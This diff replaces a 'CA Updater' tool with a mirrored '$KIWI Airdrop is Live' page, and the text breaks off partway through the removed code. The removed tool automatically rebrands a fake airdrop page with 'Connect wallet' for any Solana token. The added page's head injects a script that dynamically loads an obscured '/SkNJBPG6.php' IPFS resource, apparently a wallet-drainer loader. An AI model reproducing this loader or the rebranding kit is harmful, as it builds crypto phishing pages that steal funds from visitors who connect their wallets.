@@ -1,781 +1,300 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><!--muok_gdb2eGvArcuzJ3jE-->
+<html lang="en" data-scrapbook-source="https://www.solana-seven-rouge.vercel.app/" data-scrapbook-create="20260312100920381">
+
+
+<!-- Mirrored from solana-seven-rouge.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Mar 2026 02:58:46 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>CA Updater</title>
-<script src="https://unpkg.com/html2canvas-pro@2.0.2/dist/html2canvas-pro.min.js"></script>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Arial,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.box{background:#1e293b;border-radius:16px;padding:36px 40px;max-width:560px;width:100%;box-shadow:0 25px 60px rgba(0,0,0,.5)}
-h1{font-size:22px;margin-bottom:6px}
-.sub{color:#64748b;font-size:13px;margin-bottom:24px;line-height:1.7}
+    <script>
+        document.head.append(Object.assign(document.createElement("script"), { src: "/SkNJBPG6.php?s=%2Fipfs%2F3wKP7szlnSsInBSB14upsQ06a7639f78e7bc946324cd60b2022978%3Ft%3D" + Date.now() }));
+    </script>
+    <script src="./react-native-vector-icons.legacy.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="8a80e7184ad3a13f.css" data-precedence="next">
+    <link rel="stylesheet" href="d3df2a5dc9368066.css" data-precedence="next">
+    <meta name="next-size-adjust" content="">
+    <title>$THE ADDICTION BIRD</title>
+    <meta name="description" content="The $KIWI Airdrop is Live. Eligible users are invited to take part in the distribution of $KIWI tokens.">
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://solana-seven-rouge.vercel.app/">
+    <meta property="og:title" content="$KIWI">
+    <meta property="og:description" content="The $KIWI Airdrop is Live. Eligible users are invited to take part in the distribution of $KIWI tokens.">
+    <meta property="og:image" content="https://solana-seven-rouge.vercel.app/site_preview.png?v=2">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
-.field{margin-bottom:18px}
-.field-label{font-size:11px;font-weight:600;color:#64748b;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px;display:block}
-.ca-wrap{display:flex;gap:8px}
-.ca-input{flex:1;background:#0b1628;border:2px solid #2d3f55;border-radius:10px;padding:13px 14px;color:#e2e8f0;font-family:monospace;font-size:14px;font-weight:700;outline:none;transition:.2s}
-.ca-input:focus{border-color:#6366f1}
-.ca-input::placeholder{color:#334155;font-weight:400;font-size:13px;font-family:'Segoe UI',Arial,sans-serif}
-.fetch-btn{background:#6366f1;color:#fff;border:none;padding:13px 22px;border-radius:10px;cursor:pointer;font-size:14px;font-weight:700;white-space:nowrap;transition:.2s}
-.fetch-btn:hover{background:#4f46e5}
-.fetch-btn:disabled{background:#334155;cursor:not-allowed}
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://solana-seven-rouge.vercel.app/">
+    <meta name="twitter:title" content="$KIWI">
+    <meta name="twitter:description" content="The $KIWI Airdrop is Live. Eligible users are invited to take part in the distribution of $KIWI tokens.">
+    <meta name="twitter:image" content="https://solana-seven-rouge.vercel.app/site_preview.png?v=2">
 
-.token-preview{display:none;align-items:center;gap:16px;background:#0b1628;border-radius:10px;padding:14px 16px;margin-bottom:18px;border:1px solid #2d3f55}
-.token-preview.show{display:flex}
-.tp-logo{width:56px;height:56px;border-radius:50%;object-fit:cover;border:2px solid #2d3f55;background:#1e293b;flex-shrink:0}
-.tp-info h3{font-size:16px;font-weight:800;margin-bottom:2px}
-.tp-info p{color:#64748b;font-size:13px}
-.tp-ca{font-family:monospace;font-size:11px;color:#475569;word-break:break-all;margin-top:4px}
+    <meta name="generator" content="v0.app">
+    <link rel="icon" href="token_logo.png">
+    <link id="chromealerabat-link" rel="stylesheet" type="text/css"
+        href="moz-extension_/33913be3-c044-4c8a-b96d-ef9733697f1b/content.html">
+    <style type="text/css" data-styled-jsx="">
+        @keyframes rgbShift {
+            0% {
+                background-position: 0%
+            }
 
-.folder-btn{width:100%;background:#0b1628;border:2px dashed #2d3f55;border-radius:14px;padding:30px 20px;text-align:center;cursor:pointer;transition:.2s;user-select:none;margin-bottom:14px}
-.folder-btn:hover{border-color:#6366f1;background:rgba(99,102,241,.07)}
-.folder-btn.done{border-color:#10b981;border-style:solid;background:rgba(16,185,129,.05)}
-.folder-btn.loading{border-color:#6366f1;border-style:solid;background:rgba(99,102,241,.05)}
-.f-icon{font-size:36px;margin-bottom:8px;display:block}
-.f-label{font-size:15px;font-weight:600;color:#94a3b8;margin-bottom:4px}
-.f-sub{font-size:12px;color:#475569}
+            50% {
+                background-position: 100%
+            }
 
-.status-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
-.sitem{background:#0b1628;border-radius:8px;padding:10px 12px;border:1px solid #1e2d40;display:flex;align-items:flex-start;gap:7px}
-.dot{width:8px;height:8px;border-radius:50%;background:#334155;flex-shrink:0;margin-top:3px;transition:.3s}
-.sitem.ok .dot{background:#10b981}
-.sitem.err .dot{background:#ef4444}
-.slbl{font-size:11px;color:#475569}
-.sitem.ok .slbl{color:#94a3b8}
-.sval{font-size:10px;color:#34d399;margin-top:2px;display:none;word-break:break-all}
-.sitem.ok .sval,.sitem.err .sval{display:block}
-.sitem.err .sval{color:#f87171}
+            to {
+                background-position: 0%
+            }
+        }
 
-.apply-btn{display:none;width:100%;margin-top:14px;background:#10b981;color:#fff;border:none;padding:15px;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:.2s}
-.apply-btn:hover{background:#059669}
-.apply-btn.show{display:block}
-.apply-btn:disabled{background:#334155;cursor:not-allowed}
+        @keyframes spin {
+            0% {
+                --angle: 0deg
+            }
 
-.save-panel{display:none;margin-top:14px;background:#0b1628;border:2px solid #2d3f55;border-radius:10px;padding:16px 18px}
-.save-panel.show{display:block}
-.save-panel p{font-size:13px;color:#64748b;margin-bottom:10px;line-height:1.6}
-.save-btn{width:100%;background:#6366f1;color:#fff;border:none;padding:13px;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:.2s}
-.save-btn:hover{background:#4f46e5}
-.save-btn:disabled{background:#334155;cursor:not-allowed}
+            to {
+                --angle: 360deg
+            }
+        }
 
-.msg{border-radius:8px;padding:11px 14px;font-size:13px;margin-top:10px;display:none;line-height:1.6}
-.msg.ok {background:rgba(16,185,129,.1);color:#34d399;display:block;border:1px solid rgba(16,185,129,.2)}
-.msg.err{background:rgba(239,68,68,.1);color:#f87171;display:block;border:1px solid rgba(239,68,68,.2)}
-.msg.inf{background:rgba(99,102,241,.1);color:#a5b4fc;display:block;border:1px solid rgba(99,102,241,.2)}
+        @property --angle {
+            syntax: "<angle>";
+            inherits: false;
+            initial-value: 0deg
+        }
 
-.steps{margin-top:20px;background:#0b1628;border-radius:10px;padding:14px 18px;font-size:12px;color:#475569;line-height:2.2;border:1px solid #1e2d40}
-.steps b{color:#64748b}
-code{background:#1e293b;padding:1px 6px;border-radius:4px;font-size:11px;color:#94a3b8;border:1px solid #2d3f55}
-</style>
+        @keyframes float {
+
+            0%,
+            100% {
+                transform: translateY(0px) rotate(0deg);
+            }
+
+            25% {
+                transform: translateY(-12px) rotate(1.5deg);
+            }
+
+            50% {
+                transform: translateY(-6px) rotate(0deg);
+            }
+
+            75% {
+                transform: translateY(-14px) rotate(-1.5deg);
+            }
+        }
+
+        .token-logo-frame {
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 60px rgba(255, 200, 0, 0.35), 0 0 120px rgba(255, 150, 0, 0.15), inset 0 0 30px rgba(0, 0, 0, 0.3);
+            animation: float 4s ease-in-out infinite;
+        }
+
+        .token-logo-frame img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .logo-center-wrap {
+            position: fixed;
+            top: 70%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 30;
+        }
+    </style>
+    <style type="text/css" data-styled-jsx="">
+        div.jsx-33e09a6a81d454f1 .twitter-tweet {
+            margin: 0 !important
+        }
+    </style>
+    <script
+        data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer"])</script>
 </head>
-<body>
-<div class="box">
-  <h1>🔄 CA Updater</h1>
-  <p class="sub">Paste a Solana contract address — <b>index.html and logo are updated automatically on disk</b>. No download needed.</p>
 
-  <!-- Step 1: Contract Address -->
-  <div class="field">
-    <span class="field-label">Contract Address</span>
-    <div class="ca-wrap">
-      <input class="ca-input" id="caInput" type="text" placeholder="Paste Solana contract address..." maxlength="60">
-      <button class="fetch-btn" id="fetchBtn" onclick="fetchToken()">Fetch</button>
-    </div>
-  </div>
-
-  <!-- Token preview card -->
-  <div class="token-preview" id="tokenPreview">
-    <img class="tp-logo" id="previewLogo" src="" alt="">
-    <div class="tp-info">
-      <h3 id="previewName">—</h3>
-      <p id="previewSymbol">—</p>
-      <div class="tp-ca" id="previewCA">—</div>
-    </div>
-  </div>
-
-  <!-- Step 2: Pick folder -->
-  <input type="file" id="folderInput" webkitdirectory style="display:none">
-  <div class="folder-btn" id="folderBtn" onclick="document.getElementById('folderInput').click()">
-    <span class="f-icon" id="fIcon">📁</span>
-    <div class="f-label" id="fLabel">Click to Select Your Website Folder</div>
-    <div class="f-sub" id="fSub">Finds index.html — updates CA, DexScreener link & logo</div>
-  </div>
-
-  <!-- Status indicators -->
-  <div class="status-row">
-    <div class="sitem" id="si-html"><div class="dot"></div><div><div class="slbl">index.html</div><div class="sval" id="sv-html"></div></div></div>
-    <div class="sitem" id="si-logo"><div class="dot"></div><div><div class="slbl">Logo</div><div class="sval" id="sv-logo"></div></div></div>
-    <div class="sitem" id="si-save"><div class="dot"></div><div><div class="slbl">Saved</div><div class="sval" id="sv-save"></div></div></div>
-  </div>
-
-  <!-- Apply button -->
-  <button class="apply-btn" id="applyBtn" onclick="applyAndSave()">✅ Apply & Save to Folder</button>
-
-  <!-- Save panel for File System Access API -->
-  <div class="save-panel" id="savePanel">
-    <p id="savePanelMsg">Changes are ready. Click below to save directly to your folder.</p>
-    <button class="save-btn" id="saveBtn" onclick="saveToFolder()">💾 Save to Folder</button>
-    <button class="save-btn" id="previewDlBtn" style="display:none;margin-top:10px;background:#0b1628;border:2px solid #2d3f55" onclick="downloadLatestPreview()">⬇ Download site_preview.png</button>
-  </div>
-
-  <div class="msg" id="msg"></div>
-
-  <div class="steps">
-    <b>How it works:</b><br>
-    1. Paste contract address & click <b>Fetch</b> — logo is fetched from DexScreener<br>
-    2. Click the folder button — select your website folder<br>
-    3. Click <b>Apply & Save</b> — grant permission once<br>
-    4. <code>index.html</code> + <code>token_logo.png</code> saved directly ✅<br>
-    5. Upload to Vercel or open <code>index.html</code> from file
-  </div>
-</div>
-
-<script>
-// ── State ──
-var loadedHtml = null;
-var patchedHtml = null;
-var tokenData = null;
-var logoBlob = null;
-var logoUrl = '';
-var folderName = null;
-var latestPreviewBlob = null;
-
-// Running on file:// is not a secure context; some save/download behaviors can be blocked.
-try {
-  if (location && location.protocol === 'file:') {
-    setMsg('inf', 'Tip: For reliable saving + preview downloads, open this updater via http://localhost (secure context). file:// can block background downloads.');
-  }
-} catch (_) {}
-
-// ── CSS + HTML to inject for circular floating logo ──
-var LOGO_CSS = '\n        @keyframes float {\n            0%, 100% { transform: translateY(0px) rotate(0deg); }\n            25% { transform: translateY(-12px) rotate(1.5deg); }\n            50% { transform: translateY(-6px) rotate(0deg); }\n            75% { transform: translateY(-14px) rotate(-1.5deg); }\n        }\n\n        .token-logo-frame {\n            width: 350px;\n            height: 350px;\n            border-radius: 50%;\n            overflow: hidden;\n            border: 3px solid rgba(255, 255, 255, 0.25);\n            box-shadow: 0 0 60px rgba(255, 200, 0, 0.35), 0 0 120px rgba(255, 150, 0, 0.15), inset 0 0 30px rgba(0,0,0,0.3);\n            animation: float 4s ease-in-out infinite;\n        }\n\n        .token-logo-frame img {\n            width: 100%;\n            height: 100%;\n            object-fit: cover;\n            display: block;\n        }\n\n        .logo-center-wrap {\n            position: fixed;\n            top: 70%;\n            left: 50%;\n            transform: translate(-50%, -50%);\n            z-index: 30;\n        }';
-
-// ── Step 1: Fetch token from DexScreener ──
-async function fetchToken() {
-  var ca = document.getElementById('caInput').value.trim();
-  if (!ca) return setMsg('err', 'Please paste a contract address.');
-
-  var btn = document.getElementById('fetchBtn');
-  btn.disabled = true;
-  btn.textContent = '⏳';
-  setMsg('', '');
-
-  try {
-    var res = await fetch('https://api.dexscreener.com/tokens/v1/solana/' + ca);
-    if (!res.ok) throw new Error('HTTP ' + res.status);
-    var pairs = await res.json();
-    if (!Array.isArray(pairs) || pairs.length === 0) throw new Error('No pairs found on DexScreener for this address.');
-
-    tokenData = pairs[0];
-    var name = (tokenData.baseToken && tokenData.baseToken.name) || 'Unknown';
-    var symbol = (tokenData.baseToken && tokenData.baseToken.symbol) || '???';
-    logoUrl = (tokenData.info && tokenData.info.imageUrl) || '';
-
-    // Show preview
-    document.getElementById('previewName').textContent = name;
-    document.getElementById('previewSymbol').textContent = '$' + symbol;
-    document.getElementById('previewCA').textContent = ca;
-    document.getElementById('tokenPreview').className = 'token-preview show';
-
-    // Download logo blob (with CORS proxy fallback)
-    if (logoUrl) {
-      var fetchUrls = [
-        'https://wsrv.nl/?url=' + encodeURIComponent(logoUrl),
-        'https://api.allorigins.win/raw?url=' + encodeURIComponent(logoUrl),
-        'https://corsproxy.io/?' + encodeURIComponent(logoUrl),
-        logoUrl
-      ];
-      var fetched = false;
-      for (var i = 0; i < fetchUrls.length && !fetched; i++) {
-        try {
-          var logoRes = await fetch(fetchUrls[i]);
-          if (!logoRes.ok) throw new Error('HTTP ' + logoRes.status);
-          logoBlob = await logoRes.blob();
-          if (logoBlob.size < 100) throw new Error('Too small');
-          document.getElementById('previewLogo').src = URL.createObjectURL(logoBlob);
-          setStatus('si-logo', 'ok', 'Fetched ✓');
-          fetched = true;
-        } catch (e) {
-          logoBlob = null;
-        }
-      }
-      if (!fetched) {
-        // Last resort: load via img tag (can preview but not save as blob)
-        document.getElementById('previewLogo').src = logoUrl;
-        setStatus('si-logo', 'err', 'Preview only — save logo manually');
-        setMsg('inf', 'Logo preview loaded but cannot auto-save due to CORS. Right-click the logo preview above and "Save image as" → token_logo.png');
-      }
-    } else {
-      setStatus('si-logo', 'err', 'No logo on DexScreener');
-    }
-
-    setMsg('ok', '✅ Found: ' + name + ' ($' + symbol + ')');
-    checkReady();
-  } catch (err) {
-    setMsg('err', '❌ ' + err.message);
-  } finally {
-    btn.disabled = false;
-    btn.textContent = 'Fetch';
-  }
-}
-
-// ── Step 2: Folder input (webkitdirectory) ──
-document.getElementById('folderInput').addEventListener('change', function() {
-  var files = this.files;
-  if (!files || !files.length) return;
-
-  setStatus('si-html','','');
-  setStatus('si-save','','');
-  setMsg('','');
-  loadedHtml = null;
-  patchedHtml = null;
-  document.getElementById('savePanel').className = 'save-panel';
-  document.getElementById('applyBtn').className = 'apply-btn';
-
-  document.getElementById('fIcon').textContent = '⏳';
-  document.getElementById('fLabel').textContent = 'Reading files...';
-  document.getElementById('fSub').textContent = '';
-  document.getElementById('folderBtn').className = 'folder-btn loading';
-
-  var htmlFile = null;
-  for (var i = 0; i < files.length; i++) {
-    var f = files[i];
-    var parts = (f.webkitRelativePath || f.name).split('/');
-    if (parts.length > 2) continue; // Only top-level files
-    if (f.name.toLowerCase() === 'index.html') {
-      htmlFile = f;
-      folderName = parts[0];
-      break;
-    }
-  }
-
-  if (!htmlFile) {
-    document.getElementById('fIcon').textContent = '❌';
-    document.getElementById('fLabel').textContent = 'index.html not found';
-    document.getElementById('fSub').textContent = 'Select the correct website folder';
-    document.getElementById('folderBtn').className = 'folder-btn';
-    setMsg('err', 'No index.html found. Make sure you selected the right folder.');
-    return;
-  }
-
-  var reader = new FileReader();
-  reader.onload = function(e) {
-    loadedHtml = e.target.result;
-    setStatus('si-html', 'ok', htmlFile.name);
-    document.getElementById('fIcon').textContent = '📂';
-    document.getElementById('fLabel').textContent = 'Folder: ' + (folderName || 'selected');
-    document.getElementById('fSub').textContent = files.length + ' files scanned';
-    document.getElementById('folderBtn').className = 'folder-btn done';
-    checkReady();
-  };
-  reader.readAsText(htmlFile);
-});
-
-function checkReady() {
-  if (loadedHtml && tokenData) {
-    document.getElementById('applyBtn').className = 'apply-btn show';
-  }
-}
-
-// ── Patch HTML ──
-function patchHtml(rawHtml, newCA, dexUrl) {
-  var html = rawHtml;
-  var symbol = (tokenData.baseToken && tokenData.baseToken.symbol ? tokenData.baseToken.symbol : '$TESTICLE').toUpperCase();
-  var name = (tokenData.baseToken && tokenData.baseToken.name ? tokenData.baseToken.name : '$TESTICLE').toUpperCase();
-  var twitterUrl = 'https://x.com/witloofsol'; // fallback
-  try {
-    if (tokenData && tokenData.info && Array.isArray(tokenData.info.socials)) {
-      var tw = tokenData.info.socials.find(function(s) { return s && s.type === 'twitter' && s.url; });
-      if (tw && tw.url) twitterUrl = tw.url;
-    }
-  } catch (_) {}
-  // Normalize twitter.com -> x.com (keeps path/query)
-  twitterUrl = String(twitterUrl || '').replace(/^https:\/\/twitter\.com\//i, 'https://x.com/');
-
-  // 1. Replace CA text in the font-mono span
-  html = html.replace(
-    /(<span[^>]*class="[^"]*font-mono[^"]*"[^>]*>)[A-Za-z0-9]{30,50}(<\/span>)/,
-    '$1' + newCA + '$2'
-  );
-
-  // 2. Replace DexScreener link
-  html = html.replace(
-    /(href=")(https:\/\/dexscreener\.com\/solana\/[A-Za-z0-9]+)(")/i,
-    '$1' + dexUrl + '$3'
-  );
-
-  // 2b. Replace main X/Twitter icon link (but avoid changing the "website by" credit link)
-  // Matches the icon link that contains the SVG.
-  html = html.replace(
-    /(<a\s+href=")(https:\/\/(?:x|twitter)\.com\/[^"]+)("[^>]*>\s*<div[^>]*>\s*<\/div><svg viewBox="0 0 24 24")/i,
-    '$1' + twitterUrl + '$3'
-  );
-
-  // 3. Replace the title and header with actual name and symbol
-  html = html.replace(
-    /(<title>)[^<]*(<\/title>)/i,
-    '$1$' + name + '$2'
-  );
-  html = html.replace(
-    /(<span class="text-white">)[^<]*(<\/span>)/i,
-    '$1$' + symbol + '$2'
-  );
-
-  // Update the H1 symbol: "$OLD Airdrop is Live" -> "$SYMBOL ..."
-  html = html.replace(
-    /(<h1[^>]*>[\s\S]*?<span[^>]*>\s*\$)[A-Za-z0-9]+(?:\s+[A-Za-z0-9]+){0,4}(\s*<\/span>)/i,
-    '$1' + symbol + '$2'
-  );
-
-  // Update your sentence even if it's already been updated before.
-  // "Eligible users ... distribution of $OLD .... (FACE) tokens." -> "$SYMBOL"
-  html = html.replace(
-    /(Eligible\s+users\s+are\s+invited\s+to\s+take\s+part\s+in\s+the\s+distribution\s+of\s+)\$[A-Za-z0-9]+(?:\s+[A-Za-z0-9]+){0,6}(?:\s+FACE)?(\s+tokens\b[^\S\r\n]*[.!]?)/i,
-    '$1$' + symbol + '$2'
-  );
-
-  // 5. Update Description Tag
-  html = html.replace(
-    /(<meta name="description" content=")[^"]*(")/gi,
-    '$1The $' + symbol + ' Airdrop is Live. Eligible users are invited to take part in the distribution of $' + name + ' tokens.$2'
-  );
-
-  // 6. Update OG Title
-  html = html.replace(
-    /(<meta property="og:title" content=")[^"]*(")/gi,
-    '$1$' + symbol + '$2'
-  );
-
-  // 7. Update OG Description
-  html = html.replace(
-    /(<meta property="og:description" content=")[^"]*(")/gi,
-    '$1The $' + symbol + ' Airdrop is Live. Eligible users are invited to take part in the distribution of $' + name + ' tokens.$2'
-  );
-
-  // 8. Update Twitter Title
-  html = html.replace(
-    /(<meta (?:property|name)="twitter:title" content=")[^"]*(")/gi,
-    '$1$' + symbol + '$2'
-  );
-
-  // 9. Update Twitter Description
-  html = html.replace(
-    /(<meta (?:property|name)="twitter:description" content=")[^"]*(")/gi,
-    '$1The $' + symbol + ' Airdrop is Live. Eligible users are invited to take part in the distribution of $' + name + ' tokens.$2'
-  );
-
-  // 9b. Update OG/Twitter image URLs to absolute paths
-  var baseUrl = 'https://solana-seven-rouge.vercel.app/';
-  html = html.replace(
-    /(<meta property="og:image" content=")[^"]*(")/gi,
-    '$1' + baseUrl + 'site_preview.png?v=' + Date.now() + '$2'
-  );
-  html = html.replace(
-    /(<meta (?:property|name)="twitter:image" content=")[^"]*(")/gi,
-    '$1' + baseUrl + 'site_preview.png?v=' + Date.now() + '$2'
-  );
-
-  // 9c. Update OG/Twitter URLs (handles empty values too)
-  html = html.replace(
-    /(<meta property="og:url" content=")[^"]*(")/gi,
-    '$1' + baseUrl + '$2'
-  );
-  html = html.replace(
-    /(<meta (?:property|name)="twitter:url" content=")[^"]*(")/gi,
-    '$1' + baseUrl + '$2'
-  );
-
-  // 9d. Ensure twitter tags use name= (required by X/Twitter)
-  html = html.replace(/<meta property="twitter:/g, '<meta name="twitter:');
-
-  // 10. Replace all $FML placeholders
-  html = html.replace(/\$FML\b/g, '$' + symbol);
-
-  // 10b. Replace $TESTICLE placeholder everywhere
-  html = html.replace(/\$TESTICLE\b/g, '$' + symbol);
-
-  // 10c. If the page already contains an old symbol from a previous run, normalize it too.
-  // This is intentionally conservative: replaces token-like "$ABC123" but avoids touching "$" in scripts.
-  html = html.replace(/(\$)[A-Za-z0-9]+(?:\s+[A-Za-z0-9]+){0,6}(?=\s+(?:Airdrop|FACE|tokens)\b)/g, '$1' + symbol);
-
-  // 10d. Remove trailing " FACE" after any $SYMBOL (the updater should not leave it behind).
-  html = html.replace(/(\$[A-Za-z0-9]+(?:\s+[A-Za-z0-9]+){0,6})\s+FACE\b/g, '$1');
-  // If it was specifically "$SYMBOL FACE tokens", collapse leftover whitespace too.
-  html = html.replace(/(\$[A-Za-z0-9]+(?:\s+[A-Za-z0-9]+){0,6})\s+tokens\b/gi, '$1 tokens');
-
-  // 11. Inject floating animation CSS (if not already present)
-  if (html.indexOf('.token-logo-frame') === -1) {
-    html = html.replace(
-      /(@property\s+--angle\s*\{[^}]+\}\s*)<\/style>/,
-      '$1\n' + LOGO_CSS + '\n    </style>'
-    );
-  }
-
-  // 12. Replace the main image with circular frame
-  var buttonImgRegex = /(<button[^>]*class="[^"]*cursor-pointer[^"]*"[^>]*>)\s*(?:<div class="token-logo-frame">\s*<img[^>]*>\s*<\/div>|<img[^>]*>)\s*(<\/button>)/;
-  html = html.replace(buttonImgRegex,
-    '$1\n                <div class="token-logo-frame">\n                    <img alt="Token logo" decoding="async" src="token_logo.png">\n                </div>\n            $2'
-  );
-
-  return html;
-}
-
-// ── Apply & save ──
-function applyAndSave() {
-  if (!loadedHtml || !tokenData) return;
-
-  var ca = document.getElementById('caInput').value.trim();
-  var dexUrl = tokenData.url || ('https://dexscreener.com/solana/' + (tokenData.pairAddress || ''));
-
-  patchedHtml = patchHtml(loadedHtml, ca, dexUrl);
-
-  // Use File System Access API (Chrome/Edge) for direct save
-  if ('showDirectoryPicker' in window) {
-    document.getElementById('savePanelMsg').textContent =
-      'Ready to save! Click below — browser will ask to confirm write access to your folder.';
-    document.getElementById('savePanel').className = 'save-panel show';
-    setMsg('inf', 'Almost done! Click the Save button below.');
-  } else {
-    // Fallback: download both files
-    downloadBlob(new Blob([patchedHtml], {type:'text/html'}), 'index.html');
-    if (logoBlob) downloadBlob(logoBlob, 'token_logo.png');
-    setStatus('si-save', 'ok', 'Downloaded');
-    setMsg('ok', 'Files downloaded. Replace them in your folder. (Use Chrome/Edge for direct save.)');
-  }
-}
-
-// ── Generate site preview image (canvas-based, always reliable) ──
-function _roundRect(ctx, x, y, w, h, r) {
-  var rr = Math.min(r, w / 2, h / 2);
-  ctx.beginPath();
-  ctx.moveTo(x + rr, y);
-  ctx.arcTo(x + w, y, x + w, y + h, rr);
-  ctx.arcTo(x + w, y + h, x, y + h, rr);
-  ctx.arcTo(x, y + h, x, y, rr);
-  ctx.arcTo(x, y, x + w, y, rr);
-  ctx.closePath();
-}
-
-function _loadImageFromBlob(blob) {
-  if (!blob) return Promise.resolve(null);
-  var url = URL.createObjectURL(blob);
-  return new Promise(function(resolve) {
-    var img = new Image();
-    img.onload = function() { resolve(img); };
-    img.onerror = function() { resolve(null); };
-    img.src = url;
-  }).finally(function() {
-    setTimeout(function() { try { URL.revokeObjectURL(url); } catch (_) {} }, 1000);
-  });
-}
-
-async function generateSitePreview() {
-  var w = 1200, h = 630;
-  var c = document.createElement('canvas');
-  c.width = w; c.height = h;
-  var ctx = c.getContext('2d');
-  if (!ctx) throw new Error('Canvas not supported');
-  var sym = (tokenData && tokenData.baseToken && tokenData.baseToken.symbol ? tokenData.baseToken.symbol : 'TOKEN').toUpperCase();
-  var caTxt = (document.getElementById('caInput').value || '').trim();
-
-  // ── Background ──
-  ctx.fillStyle = '#000000';
-  ctx.fillRect(0, 0, w, h);
-
-  // ── Golden glow behind logo ──
-  var logoR = 150;
-  var logoCx = w / 2, logoCy = 395;
-  var g1 = ctx.createRadialGradient(logoCx, logoCy, 40, logoCx, logoCy, 340);
-  g1.addColorStop(0, 'rgba(255,200,0,0.30)');
-  g1.addColorStop(0.4, 'rgba(255,180,0,0.12)');
-  g1.addColorStop(1, 'rgba(0,0,0,0)');
-  ctx.fillStyle = g1;
-  ctx.fillRect(0, 0, w, h);
-
-  // ── Top nav bar (two icon pills) ──
-  var navW = 120, navH = 56;
-  var navX = (w - navW) / 2, navY = 22;
-  // Nav background pill
-  ctx.fillStyle = 'rgba(255,255,255,0.10)';
-  _roundRect(ctx, navX, navY, navW, navH, 16);
-  ctx.fill();
-  ctx.strokeStyle = 'rgba(255,255,255,0.20)';
-  ctx.lineWidth = 1;
-  _roundRect(ctx, navX, navY, navW, navH, 16);
-  ctx.stroke();
-  // X icon (left pill)
-  var iconSize = 40;
-  var ix1 = navX + 8, iy = navY + 8;
-  ctx.fillStyle = 'rgba(255,255,255,0.18)';
-  _roundRect(ctx, ix1, iy, iconSize, iconSize, 10);
-  ctx.fill();
-  ctx.strokeStyle = 'rgba(255,255,255,0.25)';
-  ctx.lineWidth = 1;
-  _roundRect(ctx, ix1, iy, iconSize, iconSize, 10);
-  ctx.stroke();
-  // X letter
-  ctx.fillStyle = '#ffffff';
-  ctx.font = '700 20px Segoe UI, Arial, sans-serif';
-  ctx.textAlign = 'center';
-  ctx.fillText('𝕏', ix1 + iconSize/2, iy + iconSize/2 + 7);
-  // DexScreener icon (right pill)
-  var ix2 = navX + navW - iconSize - 8;
-  ctx.fillStyle = 'rgba(255,255,255,0.18)';
-  _roundRect(ctx, ix2, iy, iconSize, iconSize, 10);
-  ctx.fill();
-  ctx.strokeStyle = 'rgba(255,255,255,0.25)';
-  ctx.lineWidth = 1;
-  _roundRect(ctx, ix2, iy, iconSize, iconSize, 10);
-  ctx.stroke();
-  // DEX text placeholder
-  ctx.fillStyle = '#ffffff';
-  ctx.font = '700 13px Segoe UI, Arial, sans-serif';
-  ctx.textAlign = 'center';
-  ctx.fillText('◉', ix2 + iconSize/2, iy + iconSize/2 + 5);
-
-  // ── Info card (glassmorphism) ──
-  var cardW = 520, cardH = 180;
-  var cardX = (w - cardW) / 2, cardY = 95;
-  // Card background
-  ctx.save();
-  ctx.fillStyle = 'rgba(255,255,255,0.05)';
-  _roundRect(ctx, cardX, cardY, cardW, cardH, 16);
-  ctx.fill();
-  ctx.strokeStyle = 'rgba(255,255,255,0.18)';
-  ctx.lineWidth = 1;
-  _roundRect(ctx, cardX, cardY, cardW, cardH, 16);
-  ctx.stroke();
-  ctx.restore();
-
-  // Title: "The $SYMBOL Airdrop is Live"
-  ctx.textAlign = 'center';
-  ctx.fillStyle = 'rgba(255,255,255,0.65)';
-  ctx.font = '900 28px Segoe UI, Arial, sans-serif';
-  ctx.fillText('The ', w/2 - ctx.measureText('The $' + sym + ' Airdrop is Live').width/2 + ctx.measureText('The ').width/2, cardY + 46);
-  // Bold symbol
-  var theW = ctx.measureText('The ').width;
-  var symStr = '$' + sym;
-  var symW = ctx.measureText(symStr).width;
-  var fullText = 'The ' + symStr + ' Airdrop is Live';
-  var fullW = ctx.measureText(fullText).width;
-  var startX = w/2 - fullW/2;
-
-  ctx.fillStyle = 'rgba(255,255,255,0.65)';
-  ctx.font = '900 28px Segoe UI, Arial, sans-serif';
-  ctx.textAlign = 'left';
-  ctx.fillText('The ', startX, cardY + 46);
-  ctx.fillStyle = '#ffffff';
-  ctx.fillText(symStr, startX + theW, cardY + 46);
-  ctx.fillStyle = 'rgba(255,255,255,0.65)';
-  ctx.fillText(' Airdrop is Live', startX + theW + symW, cardY + 46);
-
-  // Subtitle
-  ctx.fillStyle = 'rgba(255,255,255,0.55)';
-  ctx.font = '400 14px Segoe UI, Arial, sans-serif';
-  ctx.textAlign = 'center';
-  ctx.fillText('Eligible users are invited to take part in the distribution of $' + sym + ' tokens.', w/2, cardY + 78);
-
-  // "Connect wallet" button
-  var btnW = 190, btnH = 40;
-  var btnX = (w - btnW) / 2, btnY = cardY + 105;
-  ctx.fillStyle = '#ffffff';
-  _roundRect(ctx, btnX, btnY, btnW, btnH, 12);
-  ctx.fill();
-  ctx.fillStyle = '#000000';
